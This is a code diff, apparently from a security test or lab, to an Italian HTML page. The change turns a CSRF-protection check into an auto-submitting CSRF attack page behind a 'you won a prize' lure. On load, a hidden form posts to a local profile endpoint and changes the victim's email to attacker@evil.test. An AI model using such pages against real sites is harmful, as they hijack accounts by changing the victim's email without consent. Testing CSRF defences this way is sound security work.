@@ -2,13 +2,13 @@
 <html lang="it">
   <head>
     <meta charset="utf-8">
-    <title>Verifica protezione CSRF</title>
+    <title>Attacco CSRF</title>
   </head>
   <body>
-    <h1>Invio di una richiesta contraffatta...</h1>
-    <form id="csrf-attack" method="post" action="http://localhost:8080/profile/email">
+    <h1>Hai vinto un premio!</h1>
+    <p>Attendi mentre prepariamo la pagina...</p>
+    <form id="csrf-attack" method="post" action="http://localhost:8080/profile/email/change">
       <input name="email" type="hidden" value="attacker@evil.test">
-      <input name="csrfToken" type="hidden" value="token-falso">
     </form>
     <script>
       document.getElementById("csrf-attack").submit();
